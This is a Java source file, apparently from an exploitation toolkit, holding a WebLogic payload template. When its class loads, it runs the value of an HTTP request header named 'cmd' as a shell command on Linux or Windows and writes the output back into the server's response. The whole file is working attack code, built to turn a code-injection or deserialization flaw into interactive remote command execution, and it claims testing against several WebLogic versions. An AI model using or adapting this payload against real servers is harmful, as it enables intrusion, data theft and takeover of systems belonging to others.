package jeg.core.template.weblogic;

import jeg.core.template.undertow.UndertowCmdExecTpl;

import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Scanner;

/**
 * test in weblogic 10.3.6.0/12.1.3.0/12.2.1.3.0
 */
public class WebLogicCmdExecTpl {
    static {
        new WebLogicCmdExecTpl();
    }
    // 传参：需要执行的命令
    private String getReqHeaderName() {
        return "cmd";
    }


    public WebLogicCmdExecTpl() {
        run();
    }

    private void run(){
        String command = null;
        Thread thread = Thread.currentThread();
        Object target = null;
        PrintWriter writer = null;
        try {
            target = invokeMethod(thread, "getCurrentWork", new Class[0], new Object[0]);
            command = (String) invokeMethod(target, "getHeader", new Class[]{String.class}, new Object[]{getReqHeaderName()});
            Object response = invokeMethod(target, "getResponse", new Class[0], new Object[0]);
            writer = (PrintWriter) invokeMethod(response, "getWriter", new Class[0], new Object[0]);
        } catch (Exception e) {
            try {
                Object connectionHandler = getFV(target, "connectionHandler");
                Object request = invokeMethod(connectionHandler, "getServletRequest", new Class[0], new Object[0]);
                if (command == null) {
                    command = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{getReqHeaderName()});
                }
                Object response = invokeMethod(connectionHandler, "getServletResponse", new Class[0], new Object[0]);
                writer = (PrintWriter) invokeMethod(response, "getWriter", new Class[0], new Object[0]);
            } catch (Exception ignored) {
            }
        }
        // 执行命令
        String execRes = exec(command);
        // 回显执行结果
        writer.write(execRes);
        writer.flush();
        writer.close();
    }

    // 执行模块
    public String exec(String cmd){
        try {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String execRes = "";
            while (s.hasNext()) {
                execRes += s.next();
            }
            return execRes;
        }catch (Exception e){
            return e.getMessage();
        }
    }

    private synchronized Object getFV(final Object o, final String s) throws Exception {
        Field declaredField = null;
        Class<?> clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(s);
                break;
            } catch (NoSuchFieldException ex) {
                clazz = clazz.getSuperclass();
            }
        }
        if (declaredField == null) {
            throw new NoSuchFieldException(s);
        }
        declaredField.setAccessible(true);
        return declaredField.get(o);
    }


    private synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Method method = null;
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                method = clazz.getDeclaredMethod(methodName, paramClazz);
                break;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj, param);
    }
}
